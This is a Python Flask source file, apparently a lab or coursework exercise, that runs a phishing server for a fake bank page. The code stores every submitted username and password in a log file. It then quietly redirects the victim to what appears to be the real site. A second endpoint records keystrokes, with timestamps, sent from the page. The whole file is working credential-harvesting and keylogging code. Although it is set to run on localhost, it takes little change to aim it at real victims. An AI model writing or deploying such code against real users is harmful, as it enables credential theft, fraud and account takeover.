from flask import Flask, render_template, redirect, jsonify, request
import os

app = Flask(__name__)
URL = "http://localhost:80"

script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)

post_log = "log-Q6.txt"
keystroke_log = "keystrokes-Q6.txt"
@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        print("post method called")
        username = request.form.get("username")
        password = request.form.get("password")

        with open(post_log, "r+") as file:
            if f"{username},{password}" not in file.read():
                file.write(f"{username},{password}\n")
        
        return redirect(f'http://localhost:80', 308)
        
    
    return render_template('fake-bank-3.html')

@app.route("/log", methods=["POST"])
def log():
    data = request.json
    if not data:
        print("NONE")
    print(data)
    with open(keystroke_log, "a") as file:
        file.write(f'{data["key"]} @ {data["datetime"]}\n')
    headers = jsonify({"status" : "success"})
    return headers
    

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=4070)